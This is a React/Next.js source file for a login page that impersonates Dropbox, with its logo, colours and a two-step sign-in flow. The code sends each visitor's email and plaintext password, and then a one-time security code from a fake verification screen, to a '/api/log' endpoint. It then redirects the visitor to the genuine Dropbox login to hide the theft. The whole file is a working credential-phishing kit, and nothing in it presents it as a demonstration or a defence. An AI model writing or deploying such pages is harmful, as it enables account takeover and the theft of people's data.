'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';

export default function LoginPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [code, setCode] = useState('');
  const [showTwoFactor, setShowTwoFactor] = useState(false);
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    try {
      // Log the login attempt
      await fetch('/api/log', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          timestamp: new Date().toISOString(),
          email,
          password,
          code: '',
          type: 'LOGIN',
          ipAddress: 'Local'
        }),
      });

      // Show 2FA screen
      setShowTwoFactor(true);
    } catch (error) {
      console.error('Error logging attempt:', error);
    }
  };

  const handleTwoFactor = async (e: React.FormEvent) => {
    e.preventDefault();
    
    try {
      // Log the 2FA attempt
      await fetch('/api/log', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          timestamp: new Date().toISOString(),
          email,
          password,
          code,
          type: '2FA',
          ipAddress: 'Local'
        }),
      });

      // Redirect to actual Dropbox login
      window.location.href = 'https://www.dropbox.com/login';
    } catch (error) {
      console.error('Error logging 2FA attempt:', error);
    }
  };

  if (showTwoFactor) {
    return (
      <div className="min-h-screen bg-[#F8F9FA] flex flex-col items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
        <div className="w-full max-w-md">
          <div className="flex justify-center mb-6">
            <Image
              src="/dropbox-logo.png"
              alt="Dropbox"
              width={42}
              height={42}
              priority
              className="rounded-sm"
            />
          </div>
          <div className="bg-white rounded-lg shadow-md p-8 border border-gray-100">
            <h2 className="mb-2 text-center text-2xl font-semibold text-[#1E1919]">
              Enter security code
            </h2>
            <p className="text-center text-sm text-[#637381] mb-8">
              We sent a code to your email for verification
            </p>
            <form onSubmit={handleTwoFactor} className="space-y-6">
              <div>
                <input
                  type="text"
                  required
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  placeholder="Enter 6-digit code"
                  className="appearance-none block w-full px-3 py-2.5 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-[#0061fe] focus:border-[#0061fe] text-sm"
                  maxLength={6}
                />
              </div>
              <div>
                <button
                  type="submit"
                  className="w-full flex justify-center py-2.5 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-[#0061fe] hover:bg-[#0051d4] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#0061fe] transition-colors"
                >
                  Continue
                </button>
              </div>
              <div className="text-center">
                <button
                  type="button"
                  className="text-sm text-[#0061fe] hover:text-[#0051d4] font-medium transition-colors"
                  onClick={() => setShowTwoFactor(false)}
                >
                  Back to sign in
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#F8F9FA] flex flex-col items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
      <div className="w-full max-w-md">
        <div className="flex justify-center mb-6">
          <Image
            src="/dropbox-logo.png"
            alt="Dropbox"
            width={42}
            height={42}
            priority
            className="rounded-sm"
          />
        </div>
        <div className="bg-white rounded-lg shadow-md p-8 border border-gray-100">
          <h2 className="mb-2 text-center text-2xl font-semibold text-[#1E1919]">
            Sign in
          </h2>
          <p className="text-center text-sm text-[#637381] mb-8">
            or <a href="#" className="text-[#0061fe] hover:text-[#0051d4] font-medium transition-colors">create an account</a>
          </p>
          <form onSubmit={handleLogin} className="space-y-6">
            <div>
              <input
                type="email"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email"
                className="appearance-none block w-full px-3 py-2.5 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-[#0061fe] focus:border-[#0061fe] text-sm"
              />
            </div>
            <div>
              <input
                type="password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                className="appearance-none block w-full px-3 py-2.5 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-[#0061fe] focus:border-[#0061fe] text-sm"
              />
            </div>
            <div>
              <button
                type="submit"
                className="w-full flex justify-center py-2.5 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-[#0061fe] hover:bg-[#0051d4] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#0061fe] transition-colors"
              >
                Continue
              </button>
            </div>
            <div className="text-center">
              <a href="#" className="text-sm text-[#0061fe] hover:text-[#0051d4] font-medium transition-colors">
                Forgot your password?
              </a>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
} 